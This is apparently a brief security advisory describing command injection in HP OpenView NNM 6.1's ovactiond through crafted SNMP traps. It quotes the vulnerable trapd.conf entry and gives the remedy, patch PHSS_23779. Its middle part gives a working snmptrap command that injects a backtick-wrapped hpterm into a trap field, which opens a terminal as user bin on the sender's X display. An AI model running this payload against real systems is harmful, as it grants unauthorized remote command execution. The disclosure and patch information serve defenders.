HP Openview NNM6.1 and earlier running on unix 
have a problem with the suid bin executable 
ovactiond. It allows for starting of any program by just 
sending a trap or event to the station running the 
daemon.

Details:
in the trapd.conf the following is defined by default 
(NNM6.1):
#
EVENT 
OV_MgX_NNM_Generic .1.3.6.1.4.1.11.2.17.1.0.6000
0208 "Configuration Alarms" Warning
FORMAT Generic NNM to MgX message. $12
EXEC echo snmpnotify -v 1 -e 1.3.6.1.4.1.11.2.17.1 
$10 1.3.[snip...]
#

by sending this trap:
snmptrap -v 1 <NNM host> .1.3.6.1.4.1.11.2.17.1 
1.2.3.4 6 60000208 0 1 s "" 2 s "" 3 
s "\`/usr/bin/X11/hpterm -display <your client 
display>\`" 4 s "" [snip...] 12 s ""

You get an hpterm on your client display running 
under user bin on the NNM server.

The reason is that NNM first completes the command 
under the EXEC and then starts that in a shell.

Path:
the patch to install is PHSS_23779 and is default in 
all newest patch releases of NNM. This patch checks 
for 'strange' characters in the input strings received 
through the event or trap.

MAG,
Milo
